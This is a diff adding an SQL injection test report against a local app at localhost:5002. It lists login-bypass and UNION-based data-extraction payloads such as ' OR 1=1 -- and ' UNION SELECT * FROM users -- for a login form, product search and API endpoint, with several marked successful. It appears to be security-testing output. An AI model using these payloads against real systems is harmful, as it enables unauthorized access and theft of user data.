@@ -1,0 +1,53 @@
+SQL Injection Test Report - 20250420_173513
+==================================================
+
+Target: http://localhost:5002
+Test Type: Union Based
+Parameters: username, password
+
+Login Form Test Results:
+--------------------
+Payload: admin' --
+Status Code: 200
+Success: True
+
+Payload: ' OR '1'='1
+Status Code: 200
+Success: False
+
+Payload: ' OR 1=1 --
+Status Code: 200
+Success: True
+
+Payload: admin' UNION SELECT 1,2,3,4 --
+Status Code: 200
+Success: True
+
+Product Search Test Results:
+--------------------
+Payload: ' UNION SELECT * FROM users --
+Status Code: 200
+Success: True
+
+Payload: ' UNION SELECT 1,2,3,4 --
+Status Code: 200
+Success: True
+
+Payload: ' OR 1=1 --
+Status Code: 200
+Success: True
+
+API Endpoint Test Results:
+--------------------
+Payload: 1 UNION SELECT * FROM users --
+Status Code: 200
+Success: False
+
+Payload: 1 UNION SELECT 1,2,3,4 --
+Status Code: 200
+Success: False
+
+Payload: 1 OR 1=1 --
+Status Code: 200
+Success: False
+
